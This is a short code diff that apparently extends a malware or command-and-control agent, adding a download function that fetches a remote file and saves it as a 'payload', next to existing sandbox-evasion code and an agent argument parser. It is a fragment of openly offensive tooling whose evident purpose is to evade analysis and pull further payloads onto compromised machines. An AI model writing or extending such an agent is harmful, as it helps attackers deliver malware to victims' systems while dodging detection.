@@ -285,6 +285,13 @@ def sandbox_evasion():
             sys.exit()
 
 
+def download(url):
+    req = http.request('GET', url, headers=headers)
+    payload = url.split("/")[-1]
+    with open(payload, "wb") as file:
+        file.write(req.data)
+
+
 if __name__ == '__main__':
     try:
         agent_arguments()
